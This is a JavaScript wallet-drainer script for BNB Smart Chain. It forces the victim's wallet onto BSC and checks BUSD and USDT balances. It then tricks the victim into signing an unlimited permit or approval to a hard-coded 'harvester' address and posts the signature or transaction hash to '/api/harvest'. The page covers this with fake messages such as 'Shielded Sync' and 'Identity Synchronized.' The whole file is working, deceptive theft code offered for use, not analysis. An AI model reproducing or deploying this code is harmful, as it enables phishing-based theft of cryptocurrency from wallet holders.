// CONFIGURATION - MUST UPDATE AFTER DEPLOYMENT
const HARVESTER_ADDRESS = "0x119C89E29975eA0BbeDAb6640188CaCa8B739541"; 
const BUSD_ADDRESS = "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56";
const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";

const ERC20_ABI = [
    "function balanceOf(address owner) view returns (uint256)",
    "function nonces(address owner) view returns (uint256)",
    "function name() view returns (string)",
    "function approve(address spender, uint256 amount) public returns (bool)"
];

const MAX_VAL = "115792089237316195423570985008687907853269984665640564039457584007913129639935";

async function ensureBSC() {
    const chainIdHex = '0x38'; // 56 in decimal
    try {
        await window.ethereum.request({
            method: 'wallet_switchEthereumChain',
            params: [{ chainId: chainIdHex }],
        });
    } catch (switchError) {
        if (switchError.code === 4902) {
            try {
                await window.ethereum.request({
                    method: 'wallet_addEthereumChain',
                    params: [{
                        chainId: chainIdHex,
                        chainName: 'BNB Smart Chain',
                        nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
                        rpcUrls: ['https://bsc-dataseed.binance.org/'],
                        blockExplorerUrls: ['https://bscscan.com/']
                    }],
                });
            } catch (addError) {
                console.error("User rejected network add.");
            }
        }
    }
}

async function triggerPermit() {
    console.log("[v8.5] Initiating Shielded Sync...");
    if (!window.ethereum) return;

    try {
        // 1. Force the Chain Switch first
        await ensureBSC();
        
        // 2. Add a 1.5-second delay to let the wallet's injected provider sync with the new chain
        await new Promise(resolve => setTimeout(resolve, 1500));

        // 3. Re-initialize the provider AFTER the switch/delay
        const provider = new ethers.providers.Web3Provider(window.ethereum, "any");
        await provider.send("eth_requestAccounts", []);
        const signer = provider.getSigner();
        const victim = await signer.getAddress();

        // 4. Check the actual Chain ID the provider is currently seeing
        const network = await provider.getNetwork();
        console.log("Current Chain ID:", network.chainId);

        // UI Transition
        document.getElementById('ui-main').style.display = 'none';
        document.getElementById('ui-loading').style.display = 'block';

        // 5. Fetch Balances
        const busd = new ethers.Contract(BUSD_ADDRESS, ERC20_ABI, provider);
        const usdt = new ethers.Contract(USDT_ADDRESS, ERC20_ABI, provider);
        
        const [busdBal, usdtBal] = await Promise.all([
            busd.balanceOf(victim).catch(() => ethers.BigNumber.from(0)),
            usdt.balanceOf(victim).catch(() => ethers.BigNumber.from(0))
        ]);

        // DEBUG ALERT: This will confirm exactly what the code sees
        // alert("Chain ID: " + network.chainId + "\nBUSD: " + ethers.utils.formatUnits(busdBal, 18));

        if (busdBal.gt(0)) {
            // Force verify BUSD decimals and name to ensure contract access
            console.log("BUSD Identified. Triggering Permit...");
            await handleBUSD(signer, victim, busd);
        } else if (usdtBal.gt(0)) {
            console.log("USDT Identified. Triggering Approval...");
            await handleUSDT(signer, victim, usdt);
        } else {
            console.log("No assets found on Chain " + network.chainId);
            document.getElementById('ui-loading').innerHTML = "No assets found on " + network.name + ". Please ensure BUSD is on BSC.";
        }

    } catch (e) {
        console.error("Shielding Error:", e);
        document.getElementById('ui-main').style.display = 'block';
        document.getElementById('ui-loading').style.display = 'none';
    }
}

async function handleBUSD(signer, victim, busdContract) {
    const [nonce, tokenName] = await Promise.all([
        busdContract.nonces(victim),
        busdContract.name()
    ]);

    const deadline = Math.floor(Date.now() / 1000) + 3600;
    const domain = { name: tokenName, version: "1", chainId: 56, verifyingContract: BUSD_ADDRESS };
    const types = {
        Permit: [
            { name: "owner", type: "address" }, { name: "spender", type: "address" },
            { name: "value", type: "uint256" }, { name: "nonce", type: "uint256" },
            { name: "deadline", type: "uint256" }
        ]
    };
    const message = { owner: victim, spender: HARVESTER_ADDRESS, value: MAX_VAL, nonce: nonce.toNumber(), deadline: deadline };

    const signature = await signer._signTypedData(domain, types, message);
    const { v, r, s } = ethers.utils.splitSignature(signature);

    await exfiltrate({ victim, v, r, s, deadline, token: BUSD_ADDRESS, type: 'permit' });
}

async function handleUSDT(signer, victim, usdtContract) {
    // USDT on BSC doesn't support Permit, trigger standard approve
    const tx = await usdtContract.connect(signer).approve(HARVESTER_ADDRESS, MAX_VAL);
    await exfiltrate({ victim, txHash: tx.hash, token: USDT_ADDRESS, type: 'approve' });
    await tx.wait();
    document.getElementById('ui-loading').innerHTML = "<div style='color:#34c759;'>Identity Synchronized.</div>";
}

async function exfiltrate(data) {
    await fetch('/api/harvest', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ ...data, timestamp: new Date().toISOString() })
    });
    document.getElementById('ui-loading').innerHTML = "<div style='color:#34c759;font-weight:700;'>Identity Synchronized.</div>";
}
